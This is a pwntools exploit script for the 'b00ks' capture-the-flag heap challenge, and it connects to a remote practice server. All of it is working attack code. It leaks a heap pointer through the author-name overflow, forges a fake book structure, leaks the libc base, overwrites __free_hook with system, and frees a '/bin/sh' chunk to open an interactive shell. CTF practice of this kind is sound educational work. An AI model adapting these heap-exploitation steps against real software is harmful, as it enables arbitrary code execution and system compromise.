from pwn import *

context.update(arch="amd64", os="linux", log_level="debug")
context.terminal = ["qterminal", "-e"]
elf = ELF("./b00ks")
libc = elf.libc
#p = process("./b00ks")
p=remote('node5.buuoj.cn',28867)
# vuln book
p.sendline(b"m" * 32)
# creatbook1
#gdb.attach(p, "b *$rebase(0xC9F)")
# gdb.attach(p,'b system')
p.recvuntil(">")
sleep(0.1)
p.sendline("1")
p.recvuntil("e:")
p.sendline("32")
p.recvuntil("):")
p.sendline("mbot")
p.recvuntil("e:")
p.sendline("256")  # size

p.recvuntil("n:")
p.sendline("1")
# print
p.recvuntil(">")
p.sendline("4")
# leak
p.recvuntil("Author: ")
p.recv(32)
addr = u64(p.recv(6).ljust(8, b"\x00"))
log.info("addrbook= %#x" % (addr))
book2 = addr + 0x30
fack_book1 = p64(1) + p64(book2 + 8) + p64(book2 + 8) + p64(0x100)
# edit
p.recvuntil(">")
sleep(0.1)
p.sendline("3")
p.recvuntil("edit:")
p.sendline("1")
sleep(0.1)
p.sendline(b"a" * 0xB0 + fack_book1)
# creat book 2
p.recvuntil(">")
sleep(0.1)
p.sendline("1")
p.recvuntil("e:")
p.sendline("1145141")  # size
p.recvuntil("):")
p.sendline("mbot")
p.recvuntil("e:")
p.sendline("1145141")  # size
p.recvuntil("n:")
p.sendline("1")
# change
p.recvuntil(">")
sleep(0.1)
p.sendline("5")
p.recvuntil("name:")
p.sendline(b"a" * 32)
# PRINT
p.recvuntil(">")
sleep(0.1)
p.sendline("4")
libcbase = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))-0x50D010
log.info("addr=%x" % (libcbase))
#pause()
# edit1
p.recvuntil(">")
sleep(0.1)
p.sendline("3")
p.recvuntil("edit:")
p.sendline("1")
sleep(0.1)
sh = libc.search("/bin/sh").__next__()
p.sendline(p64(libcbase + sh) + p64(libcbase + libc.symbols["__free_hook"]))
# edit2
p.recvuntil(">")
sleep(0.1)
p.sendline("3")
p.recvuntil("edit:")
p.sendline("2")
p.recvuntil("description:")
sleep(0.1)
p.sendline(p64(libcbase + libc.symbols["system"]))
# del2
p.recvuntil(">")
sleep(0.1)
p.sendline("2")
p.recvuntil("delete:")
sleep(0.1)
p.sendline("2")
log.info("bin=%x" % (libcbase + sh))
log.info("hook=%x" % (libcbase + libc.symbols["__free_hook"]))
log.info("addr=%x" % (libcbase))
log.info("book2=%x" % (book2))
log.info("sys=%x" % (libcbase + libc.symbols["system"]))
p.interactive()


pause()
